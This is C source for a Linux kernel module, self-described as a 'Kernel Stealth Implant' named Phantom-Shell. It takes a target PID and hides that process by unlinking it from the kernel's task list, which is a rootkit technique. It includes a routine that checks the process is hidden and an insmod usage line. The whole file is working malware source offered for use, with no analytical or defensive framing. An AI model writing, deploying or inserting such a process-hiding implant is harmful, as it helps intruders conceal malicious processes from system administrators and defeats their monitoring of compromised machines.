#include <linux/module.h>   
#include <linux/kernel.h> 
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/list.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("pwnxr");
MODULE_DESCRIPTION("Kernel Stealth Implant");

static int target_pid = 0;
module_param(target_pid, int, 0644);
MODULE_PARM_DESC(target_pid, "The PID of the process to hide");

static void hide_process(void) {
    struct task_struct *task;
    struct task_struct *target_task = NULL;

    printk(KERN_INFO "Phantom-Shell: Searching for PID %d to hide...\n", target_pid);

    for_each_process(task) {
        if (task->pid == target_pid) {
            target_task = task;
            break;
        }
    }

    if (target_task) {
        list_del_init(&target_task->tasks);

        printk(KERN_INFO "Phantom-Shell: HIDDEN! Process %s [PID: %d] removed from task list.\n", 
               target_task->comm, target_task->pid);
    } else {
        printk(KERN_INFO "Phantom-Shell: PID %d not found!\n", target_pid);
    }
}

static void list_processes(void) {
    struct task_struct *task;
    printk(KERN_INFO "Phantom-Shell: --- Verifying Process List ---\n");

    for_each_process(task) {
        if (task->pid == target_pid) {
             printk(KERN_INFO "WARNING: Process %d is STILL VISIBLE in the list!\n", task->pid);
        }
    }
    printk(KERN_INFO "Phantom-Shell: --- Verification End ---\n");
}


static int __init implant_init(void) {
    printk(KERN_INFO "Phantom-Shell: Activated.\n");    

    if (target_pid != 0) {
        hide_process();
        list_processes();
    } else {
        printk(KERN_INFO "Phantom-Shell: No target_pid provided. Usage: insmod implant.ko target_pid=XXXX\n");
    }

    list_processes();
    return 0; 
}

static void __exit implant_exit(void) {
    printk(KERN_INFO "Phantom-Shell: Unloaded.\n");
}

module_init(implant_init);
module_exit(implant_exit);